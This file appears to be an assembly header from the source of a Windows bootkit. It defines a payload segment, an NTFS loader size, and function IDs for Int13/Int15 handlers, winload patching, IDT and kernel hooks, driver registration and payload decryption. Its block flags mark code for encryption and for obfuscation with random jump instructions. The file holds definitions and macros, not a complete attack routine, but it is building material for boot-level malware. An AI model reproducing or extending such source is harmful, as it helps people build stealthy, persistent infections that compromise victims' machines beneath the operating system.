INTEGER MACRO x
x
ENDM


PAYLOAD_DATA_SEGMENT	equ		8000h
PAYLOAD_DATA_ADDRESS	equ		100000h

NTFS_LOADER_SIZE		equ		1e00h

;// Block flags 
B_ENTRY		equ	1			;// entry block 
B_CORE		equ	2			;// core block
B_DATA		equ 4			;// block contains data

B_WIN5		equ	10h			;// XP and w2k3 compatible 
B_WIN6		equ	20h			;// Vista, Win7 and w2k8 compatible

B_CODE16	equ	100h		;// block is 16-bit code
B_INIT		equ	200h		;// block used for initialization, so it shouldn't be encrypted
B_NOEBP		equ 400h		;// block uses "CALL NEAR" instead of "CALL EBP"

B_ALIASES	equ 4000h		;// block is a collection of aliases
B_JUMPS		equ 8000h		;// mix code block with random jump instructions


F_Main				equ 0
F_Unpack			equ	1
F_DoMatch			equ	2
F_GetBit			equ 3
F_GetGamma			equ 4
F_NormalCp			equ 5
F_ApplyRelocs		equ	6
F_Handler13			equ	7
F_Ofs				equ 8
F_PmInit			equ	9
F_GetWinload		equ	10
F_Int1Handler		equ	11
F_PatchLdr			equ 12
F_Winload			equ 13
F_InitNt			equ	14
F_TransferHook5		equ 15
F_LmSwitch			equ	16
F_PatchCall			equ 17
F_HookAlloc6		equ 18
F_LoadFile6			equ	19
F_RestoreCall		equ 20
F_FileName			equ	21
F_GetParamPtr		equ	22
F_HookAlloc5		equ	23
F_LoadFile5			equ 24
F_RegisterDriver	equ 25
F_TransferHook6		equ 26
F_HookIdt			equ	27
F_LoadData			equ 28
F_BuildImage		equ	29
F_Handler15			equ	30
F_KernelHook5		equ	31
F_DecryptImage		equ 32
F_Startup			equ 33


CodeBase	equ 0a000h
IdtBase		equ 0c000h
IdtSize		equ 64*8
GdtBase		equ	(IdtBase + IdtSize)
GdtSize		equ (4*8)
GdtLimit	equ	(GdtSize - 1)

CODE_BASE_OFFSET	equ 2		;// See Handler1 function for details


;// returns pointer to a block with specified index in EAX
GETPTR MACRO x
	db	0d6h		; SALC
	db	x
	db	0ffh, 0d5h	; CALL EBP/BP	
	db F_Ofs
ENDM


;// generates MOV CL, XX instruction, where XX - specified function ID
MOV_CL_ID MACRO x
	db 0d6h
	db x
ENDM


;// REX prefixes used
REXW	MACRO
	db 48h
ENDM

REXB	MACRO
	db 41h
ENDM

;// Long instructions
INCL_EAX	MACRO
	db 0ffh, 0c0h
ENDM

INCL_ECX	MACRO
	db 0ffh, 0c1h
ENDM

DECL_EDI	MACRO
	db 0ffh, 0cfh
ENDM

CHSS STRUC
	StartSector		dq ?
	NumberSectors	dw ?
	XorValue		dd ?
CHSS ENDS


; enum _TYPE_OF_MEMORY (standard)
 LoaderExceptionBlock  = 0
 LoaderSystemBlock  = 1
 LoaderFree       = 2
 LoaderBad        = 3
 LoaderLoadedProgram  = 4
 LoaderFirmwareTemporary  = 5
 LoaderFirmwarePermanent  = 6
 LoaderOsloaderHeap  = 7
 LoaderOsloaderStack  = 8
 LoaderSystemCode  = 9
 LoaderHalCode    = 0Ah
 LoaderBootDriver  = 0Bh
 LoaderConsoleInDriver  = 0Ch
 LoaderConsoleOutDriver  = 0Dh
 LoaderStartupDpcStack  = 0Eh
 LoaderStartupKernelStack  = 0Fh
 LoaderStartupPanicStack  = 10h
 LoaderStartupPcrPage  = 11h
 LoaderStartupPdrPage  = 12h
 LoaderRegistryData  = 13h
 LoaderMemoryData  = 14h
 LoaderNlsData    = 15h
 LoaderSpecialMemory  = 16h
 LoaderBBTMemory  = 17h
 LoaderReserve    = 18h
 LoaderXIPRom     = 19h
 LoaderHALCachedMemory  = 1Ah
 LoaderMaximum    = 1Bh